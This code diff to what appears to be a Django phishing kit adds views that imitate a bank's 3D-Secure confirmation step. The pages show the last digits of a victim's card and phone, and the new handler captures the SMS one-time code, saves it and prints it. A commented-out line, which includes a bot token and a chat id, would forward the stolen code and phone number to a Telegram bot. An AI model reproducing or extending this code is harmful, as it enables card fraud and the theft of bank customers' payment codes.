@@ -312,5 +312,32 @@ def leobank3d(request):
     'cc': last_contact.cc[-4:],
     }
     
+    return render( request,'pages/unibank3d.html',context )
+
+
+
+@ensure_csrf_cookie
+def unibank(request):
+    last_contact = ContactModel.objects.latest('created_at')
+    number = str(last_contact.phone)
+
+    context = {
+        'number': number[-4:],
+        'amount': last_contact.amount,
+        'cc': last_contact.cc[-4:],
+    }
     
     return render( request,'pages/unibank3d.html',context )
+
+
+@ensure_csrf_cookie
+def unibank3d(request):
+    sms = request.POST.get('secpass')
+    last_contact = ContactModel.objects.latest('created_at')
+    last_contact.sms=sms
+    last_contact.save()
+    print(sms)
+    #telegram
+    # response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
+
+    return render( request,'pages/loading.html' )
